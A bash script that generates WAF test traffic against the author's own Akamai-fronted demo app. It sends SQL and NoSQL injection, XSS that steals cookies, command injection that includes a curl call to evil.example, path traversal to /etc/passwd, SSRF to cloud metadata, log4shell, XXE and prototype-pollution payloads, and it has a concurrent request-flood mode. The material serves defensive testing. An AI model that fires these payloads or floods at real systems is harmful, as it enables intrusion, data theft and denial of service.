#!/usr/bin/env bash
#
# waf-traffic.sh — generate mixed traffic against YOUR OWN Akamai-fronted
# test app so WAF events show up in Security Events / Web Security Analytics.
#
# Only run this against a host you own and are authorized to test.
#
# Usage:
#   ./waf-traffic.sh                      # defaults: 20 rounds of mixed attack traffic
#   ./waf-traffic.sh -t https://sec.akamaicr.art -n 50 -d 2
#   ./waf-traffic.sh -n 0                 # run forever (Ctrl-C to stop)
#
# Burst mode (exercise Akamai rate controls / DoS protection):
#   ./waf-traffic.sh -b                   # default burst: 500 reqs, 25 at a time
#   ./waf-traffic.sh -b -r 2000 -c 50     # 2000 reqs, 50 concurrent
#   ./waf-traffic.sh -b -p /login         # hammer a specific path
#
# Rate controls are per-client-IP, so run the burst from the same machine/IP
# you watch in Security Events. Only run against a host you own.
#
set -u

TARGET="https://sec.akamaicr.art"
ROUNDS=20          # number of loops; 0 = infinite
DELAY=2            # seconds between rounds
BURST=0            # -b turns on burst mode
BURST_REQS=500     # total requests in a burst
BURST_CONC=25      # concurrent requests
BURST_PATH="/"     # path to hammer

while getopts "t:n:d:br:c:p:h" opt; do
  case "$opt" in
    t) TARGET="$OPTARG" ;;
    n) ROUNDS="$OPTARG" ;;
    d) DELAY="$OPTARG" ;;
    b) BURST=1 ;;
    r) BURST_REQS="$OPTARG" ;;
    c) BURST_CONC="$OPTARG" ;;
    p) BURST_PATH="$OPTARG" ;;
    h) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown option; use -h"; exit 1 ;;
  esac
done

# curl flags: silent, discard body, follow redirects, 20s cap, print the code.
req() {
  local label="$1"; shift
  local code
  code=$(curl -sk --globoff -o /dev/null -w '%{http_code}' --max-time 20 "$@")
  printf '  %-22s %-40s -> %s\n' "$label" "${*: -1}" "$code"
}

round() {
  echo "[$(date '+%H:%M:%S')] round $1"

  # --- Normal, legitimate traffic ---
  req "normal: home"        "$TARGET/"
  req "normal: login page"  "$TARGET/login"
  req "normal: about"       "$TARGET/about_new"
  req "normal: css"         "$TARGET/public/css/screen.css"

  # --- SQL injection ---
  req "sqli: or-1-1"        "$TARGET/?q=1'%20OR%20'1'='1"
  req "sqli: union-select"  "$TARGET/?id=1%20UNION%20SELECT%20username,password%20FROM%20users"
  req "sqli: comment"       "$TARGET/?id=1;--%20"
  req "sqli: sleep"         "$TARGET/?id=1%20AND%20SLEEP(5)"
  req "sqli: stacked drop"  "$TARGET/?id=1;DROP%20TABLE%20users;--"
  req "sqli: in header"     -H "X-Search: ' OR 1=1 --" "$TARGET/"

  # --- NoSQL injection (Mongo operators, which Goof is actually vulnerable to) ---
  req "nosqli: gt"          -H 'Content-Type: application/json' \
                            -d '{"username":"admin@snyk.io","password":{"$gt":""}}' "$TARGET/login"
  req "nosqli: ne"          "$TARGET/?username[\$ne]=x"

  # --- Cross-site scripting ---
  req "xss: script-tag"     "$TARGET/?s=<script>alert(1)</script>"
  req "xss: img-onerror"    "$TARGET/?s=<img%20src=x%20onerror=alert(1)>"
  req "xss: svg-onload"     "$TARGET/?s=<svg/onload=alert(1)>"
  req "xss: js-uri"         "$TARGET/?url=javascript:alert(document.cookie)"
  req "xss: in form field"  -d "content=<script>alert(document.cookie)</script>" "$TARGET/create"

  # --- Command injection ---
  req "cmdi: cat passwd"    "$TARGET/?cmd=;cat%20/etc/passwd"
  req "cmdi: backticks"     "$TARGET/?cmd=\`id\`"
  req "cmdi: pipe-curl"     "$TARGET/?cmd=|curl%20http://evil.example/x"

  # --- Path traversal / LFI ---
  req "lfi: etc-passwd"     "$TARGET/?file=../../../../etc/passwd"
  req "lfi: encoded"        "$TARGET/?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
  req "lfi: win-hosts"      "$TARGET/?file=..\\..\\..\\windows\\win.ini"

  # --- Server-side request forgery ---
  req "ssrf: metadata"      "$TARGET/?url=http://169.254.169.254/latest/meta-data/"
  req "ssrf: localhost"     "$TARGET/?url=http://127.0.0.1:3001/admin"

  # --- API-style JSON attacks ---
  req "api: sqli in json"   -H 'Content-Type: application/json' \
                            -d '{"content":"1 OR 1=1"}' "$TARGET/create"
  req "api: xss in json"    -H 'Content-Type: application/json' \
                            -d '{"content":"<script>alert(1)</script>"}' "$TARGET/create"
  req "api: proto-pollute"  -H 'Content-Type: application/json' \
                            -d '{"__proto__":{"isAdmin":true}}' "$TARGET/create"

  # --- Bad reputation / scanner user-agents ---
  req "ua: sqlmap"          -A "sqlmap/1.7"        "$TARGET/"
  req "ua: nikto"           -A "Nikto/2.5.0"       "$TARGET/"
  req "ua: nmap"            -A "Mozilla/5.0 (Nmap Scripting Engine)" "$TARGET/"
  req "ua: acunetix"        -A "acunetix-wvs"      "$TARGET/"

  # --- Protocol / header oddities WAF rules flag ---
  req "hdr: null-byte path" "$TARGET/%00"
  req "hdr: log4shell-ish"  -H 'User-Agent: ${jndi:ldap://x/a}' "$TARGET/"
  req "hdr: crlf inject"    "$TARGET/?x=1%0d%0aSet-Cookie:%20injected=1"
  req "hdr: xxe body"       -H 'Content-Type: application/xml' \
                            -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>' "$TARGET/create"
}

# Fire BURST_REQS requests at BURST_CONC concurrency against one path,
# then tally the status codes so you can see when rate controls kick in.
burst() {
  local url="$TARGET$BURST_PATH"
  echo "BURST: $BURST_REQS requests, $BURST_CONC concurrent -> $url"
  local start; start=$(date +%s)
  seq 1 "$BURST_REQS" | xargs -P "$BURST_CONC" -I{} \
    curl -sk --globoff -o /dev/null -w '%{http_code}\n' --max-time 20 "$url" \
    | sort | uniq -c | sort -rn | sed 's/^/  status /'
  local elapsed=$(( $(date +%s) - start ))
  [ "$elapsed" -lt 1 ] && elapsed=1
  echo "  done in ${elapsed}s (~$(( BURST_REQS / elapsed )) req/s)"
  echo "  429 = rate-limited, 403 = denied by rate control, 503 = origin shed load"
}

if [ "$BURST" -eq 1 ]; then
  echo "Target: $TARGET   Mode: BURST"
  i=1
  while :; do
    echo "[$(date '+%H:%M:%S')] burst $i"
    burst
    [ "$ROUNDS" -ne 0 ] && [ "$i" -ge "$ROUNDS" ] && break
    i=$((i+1))
    sleep "$DELAY"
  done
  echo "done."
  exit 0
fi

echo "Target: $TARGET   Rounds: $ROUNDS   Delay: ${DELAY}s"
echo "Press Ctrl-C to stop."
i=1
while :; do
  round "$i"
  [ "$ROUNDS" -ne 0 ] && [ "$i" -ge "$ROUNDS" ] && break
  i=$((i+1))
  sleep "$DELAY"
done
echo "done."
